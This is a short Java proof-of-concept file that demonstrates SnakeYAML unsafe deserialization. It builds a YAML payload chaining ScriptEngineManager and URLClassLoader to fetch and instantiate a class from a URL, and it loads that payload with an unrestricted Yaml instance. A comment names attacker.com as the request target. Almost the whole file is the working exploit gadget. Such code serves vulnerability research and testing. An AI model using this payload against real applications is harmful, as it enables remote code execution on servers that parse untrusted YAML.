package me.monkey.demo;

import org.yaml.snakeyaml.Yaml;

import java.net.MalformedURLException;

public class YamlPoC {
    public static void main(String[] argv) throws MalformedURLException {
        // 找到new函数时就会执行的类即可。
        String malicious = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "
                + "[[!!java.net.URL [\"http://localhost:8080/api/test\"]]]]";
        Yaml yaml = new Yaml();            // Unsafe instance of Yaml that allows any constructor to be called.
        Object obj = yaml.load(malicious); // Make request to http://attacker.com
    }
}